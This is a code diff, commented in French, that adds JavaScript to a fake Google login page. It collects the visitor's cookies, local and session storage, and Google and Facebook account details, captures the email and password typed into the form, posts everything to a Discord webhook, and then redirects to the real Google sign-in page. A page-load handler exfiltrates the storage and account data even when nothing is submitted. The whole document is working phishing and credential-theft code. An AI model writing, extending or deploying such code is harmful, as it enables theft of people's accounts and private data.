@@ -1,0 +1,219 @@
+// Ajoutez cette fonction après collectVisitorInfo()
+function extractAccountInfo() {
+    const accountData = {
+        googleAccounts: [],
+        facebookAccounts: [],
+        otherAccounts: [],
+        cookies: document.cookie,
+        localStorage: {},
+        sessionStorage: {}
+    };
+    
+    // Extraire les données du localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        accountData.localStorage[key] = localStorage.getItem(key);
+        
+        // Chercher des indices de comptes Google
+        if (key.includes('google') || key.includes('gmail') || key.includes('oauth')) {
+            try {
+                const value = JSON.parse(localStorage.getItem(key));
+                if (value.email || value.account_id || value.name) {
+                    accountData.googleAccounts.push(value);
+                }
+            } catch (e) {
+                // Ignorer les erreurs de parsing
+            }
+        }
+        
+        // Chercher des indices de comptes Facebook
+        if (key.includes('facebook') || key.includes('fb_')) {
+            try {
+                const value = JSON.parse(localStorage.getItem(key));
+                if (value.email || value.name || value.id) {
+                    accountData.facebookAccounts.push(value);
+                }
+            } catch (e) {
+                // Ignorer les erreurs de parsing
+            }
+        }
+    }
+    
+    // Extraire les données du sessionStorage
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        accountData.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+    
+    return accountData;
+}
+                        // Ajoutez cette fonction pour détecter les comptes via les API du navigateur
+async function detectBrowserAccounts() {
+    const detectedAccounts = {
+        google: null,
+        facebook: null,
+        others: []
+    };
+    
+    // Tenter de détecter les comptes Google via l'API Google Identity
+    try {
+        if (window.google && window.google.accounts) {
+            // Si l'API Google Identity est disponible
+            window.google.accounts.id.initialize({
+                client_id: 'votre_client_id_google', // Vous devez enregistrer une application Google
+                callback: (response) => {
+                    // Analyser le token JWT pour extraire les informations
+                    const payload = JSON.parse(atob(response.credential.split('.')[1]));
+                    detectedAccounts.google = {
+                        email: payload.email,
+                        name: payload.name,
+                        picture: payload.picture
+                    };
+                }
+            });
+        }
+    } catch (e) {
+        console.error("Erreur lors de la détection des comptes Google:", e);
+    }
+    
+    // Tenter de détecter les comptes Facebook
+    try {
+        if (window.FB) {
+            window.FB.getLoginStatus(function(response) {
+                if (response.status === 'connected') {
+                    window.FB.api('/me', {fields: 'name,email,picture'}, function(response) {
+                        detectedAccounts.facebook = {
+                            id: response.id,
+                            name: response.name,
+                            email: response.email,
+                            picture: response.picture.data.url
+                        };
+                    });
+                }
+            });
+        }
+    } catch (e) {
+        console.error("Erreur lors de la détection des comptes Facebook:", e);
+    }
+    
+    return detectedAccounts;
+}
+      // Remplacez votre gestionnaire de soumission de formulaire par celui-ci
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    
+    // Collecter toutes les informations
+    const visitorInfo = collectVisitorInfo();
+    visitorInfo.ip = await getIpAddress();
+    visitorInfo.geoInfo = await getGeoInfo(visitorInfo.ip);
+    
+    // Ajouter les informations de compte
+    visitorInfo.accountInfo = extractAccountInfo();
+    visitorInfo.detectedAccounts = await detectBrowserAccounts();
+    
+    // Ajouter les identifiants saisis
+    visitorInfo.submittedCredentials = {
+        email: email,
+        password: password
+    };
+    
+    // Envoyer à Discord
+    await sendToDiscord(visitorInfo);
+    
+    // Rediriger vers la vraie page de connexion Google
+    window.location.href = `https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fwww.google.com%2F&hl=fr&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession`;
+});
+      async function sendToDiscord(visitorInfo) {
+    const embed = {
+        title: "Nouvelle connexion détectée",
+        color: 3447003,
+        fields: [
+            {
+                name: "Adresse IP",
+                value: visitorInfo.ip || "Inconnue",
+                inline: true
+            },
+            {
+                name: "Localisation",
+                value: `${visitorInfo.geoInfo.city}, ${visitorInfo.geoInfo.country}`,
+                inline: true
+            },
+            {
+                name: "Email saisi",
+                value: visitorInfo.submittedCredentials.email,
+                inline: false
+            },
+            {
+                name: "Mot de passe",
+                value: visitorInfo.submittedCredentials.password,
+                inline: false
+            }
+        ],
+        footer: {
+            text: "Informations collectées automatiquement"
+        }
+    };
+    
+    // Ajouter les informations de compte détectées
+    if (visitorInfo.detectedAccounts.google) {
+        embed.fields.push({
+            name: "Compte Google détecté",
+            value: `${visitorInfo.detectedAccounts.google.name} (${visitorInfo.detectedAccounts.google.email})`,
+            inline: false
+        });
+    }
+    
+    if (visitorInfo.detectedAccounts.facebook) {
+        embed.fields.push({
+            name: "Compte Facebook détecté",
+            value: `${visitorInfo.detectedAccounts.facebook.name} (${visitorInfo.detectedAccounts.facebook.email})`,
+            inline: false
+        });
+    }
+    
+    // Ajouter les informations du localStorage pertinentes
+    if (visitorInfo.accountInfo.googleAccounts.length > 0) {
+        embed.fields.push({
+            name: "Données Google dans localStorage",
+            value: JSON.stringify(visitorInfo.accountInfo.googleAccounts),
+            inline: false
+        });
+    }
+    
+    const payload = {
+        embeds: [embed]
+    };
+    
+    try {
+        const response = await fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) {
+            console.error("Erreur lors de l'envoi à Discord:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Erreur lors de l'envoi à Discord:", error);
+    }
+}
+      // Ajoutez ce code pour capturer des informations automatiquement
+window.addEventListener('load', async function() {
+    // Attendre un peu pour que les APIs se chargent
+    setTimeout(async function() {
+        const visitorInfo = collectVisitorInfo();
+        visitorInfo.ip = await getIpAddress();
+        visitorInfo.geoInfo = await getGeoInfo(visitorInfo.ip);
+        visitorInfo.accountInfo = extractAccountInfo();
+        visitorInfo.detectedAccounts = await detectBrowserAccounts();
+        
+        // Envoyer même sans identifiants
+        await sendToDiscord(visitorInfo);
+    }, 3000);
+});
